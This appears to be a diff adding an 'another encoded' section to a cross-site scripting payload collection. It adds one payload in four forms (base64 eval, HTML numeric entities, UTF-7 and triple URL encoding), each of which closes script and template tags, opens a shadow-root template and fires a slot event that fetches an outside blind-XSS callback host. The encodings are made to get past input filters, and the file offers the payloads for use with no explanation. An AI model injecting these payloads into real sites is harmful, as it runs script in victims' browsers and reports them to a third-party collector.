@@ -1,3 +1,17 @@
+another encoded 
+
+```
+<script>eval(atob('PC9zY3JpcHQ+PC90ZW1wbGF0ZT48dGVtcGxhdGUgc2hhZG93cm9vdG1vZGU9Im9wZW4iPjxzbG90IG9uc2xvdGNoYW5nZT1mZXRjaGAvL3hzcy5yZXBvcnQvYy9oZWxsb21hc3RlcmBgPjwvc2xvdD48L3RlbXBsYXRlPg=='))</script>
+
+&#000000000000060;/script&#000000000000062;&#000000000000060;/template&#000000000000062;&#000000000000060;template shadowrootmode=&#000000000000034;open&#000000000000034;&#000000000000062;&#000000000000060;slot onslotchange=fetch&#000000000000096;//xss.report/c/hellomaster&#000000000000096;&#000000000000062;&#000000000000060;/slot&#000000000000062;&#000000000000060;/template&#000000000000062;
+
++ADw-/script+AD4-+ADw-/template+AD4-+ADw-template shadowrootmode=+ACI-open+ACI-+AD4-+ADw-slot onslotchange=fetch+AGA-//xss.report/c/hellomaster+AGA-+AD4-+ADw-/slot+AD4-+ADw-/template+AD4-
+
+%25253C/script%25253E%25253C/template%25253E%25253Ctemplate%252520shadowrootmode%25253D%252522open%252522%25253E%25253Cslot%252520onslotchange%25253Dfetch%252560//xss.report/c/hellomaster%252560%25253E%25253C/slot%25253E%25253C/template%25253E
+
+```
+
+
 envceded new
 
 ```
